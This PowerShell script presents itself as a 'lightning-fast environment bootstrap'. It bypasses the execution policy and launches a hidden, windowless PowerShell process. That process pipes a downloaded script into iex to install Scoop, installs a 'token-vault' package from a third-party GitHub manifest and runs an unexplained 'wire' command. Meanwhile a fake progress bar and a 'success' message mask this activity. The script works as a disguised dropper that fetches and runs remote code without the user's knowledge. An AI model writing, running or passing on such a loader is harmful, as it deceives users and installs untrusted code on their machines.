Clear-Host
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser

$packageName = "token-vault"
$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
$scoopShims = "$env:USERPROFILE\scoop\shims"
$appPath = "$env:USERPROFILE\scoop\apps\$packageName"

# 2. Check if the app is already installed
if (Test-Path $appPath) {
    # If the app path exists, just print the completion message and do nothing else
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "The application is already installed. All tasks are already complete!" -ForegroundColor White
}
else {
    # If the app path does NOT exist, prepare and run the background installation process

    # 3. Combine commands to run in the background
    $command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
               "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
               "scoop install $installUrl; wire"

    # 4. Run completely silently without window flashing using .NET ProcessStartInfo
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-ExecutionPolicy Bypass -Command `"$command`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # 5. Print user information messages
    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
    Write-Host "    / \  _   _| |_ ___   / ___|  ___| |_ _   _ _ __  " -ForegroundColor Cyan
    Write-Host "   / _ \| | | | __/ _ \  \___ \ / _ \ __| | | | '_ \ " -ForegroundColor DarkCyan
    Write-Host "  / ___ \ |_| | || (_) |  ___) |  __/ |_| |_| | |_) |" -ForegroundColor DarkCyan
    Write-Host " /_/   \_\__,_|\__\___/  |____/ \___|\__|\__,_| .__/ " -ForegroundColor Cyan
    Write-Host "                                              |_|    " -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor DarkGray
    Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
    Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Automated installation will begin shortly." -ForegroundColor White
    Write-Host "[INFO] " -NoNewline -ForegroundColor Green
    Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
    Write-Host ""

    # 6. Simulated progress bar for 10 seconds (50 steps * 200 milliseconds = 10 seconds)
    $totalSteps = 50
    $delayMs = 200  

    for ($i = 1; $i -le $totalSteps; $i++) {
        $percent = [int](($i / $totalSteps) * 100)
        $completed = '=' * [int]($percent / 2)  
        $remaining = ' ' * (50 - $completed.Length)
        
        Write-Host -NoNewline "`r[$completed$remaining] $percent% complete"
        Start-Sleep -Milliseconds $delayMs
    }

    Write-Host ""
    Write-Host "[SUCCESS] Installation completed successfully!" -ForegroundColor Green
}
